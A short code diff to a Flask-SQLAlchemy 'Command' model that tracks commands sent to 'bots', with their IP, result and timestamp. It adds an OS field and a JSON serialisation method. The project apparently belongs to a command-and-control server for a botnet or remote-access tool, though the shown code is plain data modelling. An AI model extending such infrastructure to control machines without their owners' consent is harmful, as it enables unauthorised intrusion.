@@ -79,18 +79,30 @@ class Command(db.Model):
     id = db.Column('cmd_id', db.Integer, primary_key=True)
     cmd = db.Column(db.String(128))
     bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
+    bot_os = db.Column(db.String(128))
     bot_ip = db.Column(db.String(128))
     timestamp = db.Column(db.DateTime) 
     latest = db.Column(db.Boolean, default=False)
     result = db.Column(db.String(500))
 
-    def __init__(self, cmd, bot_id, bot_ip):
+    def __init__(self, cmd, bot_id, bot_ip, bot_os):
         self.cmd = cmd 
         self.bot_id = bot_id 
         self.bot_ip = bot_ip 
+        self.bot_os = bot_os
         self.timestamp = datetime.now()
         self.latest = False
         self.result = ''
+
+    def jsoncommand(self):
+        return {
+            'id': self.id,
+            'cmd': self.cmd,
+            'bot_id': self.bot_id,
+            'bot_ip': self.bot_ip,
+            'bot_os': self.bot_os,
+            'result': self.result
+        }
 
     def set_latest_true(self):
         self.latest = True
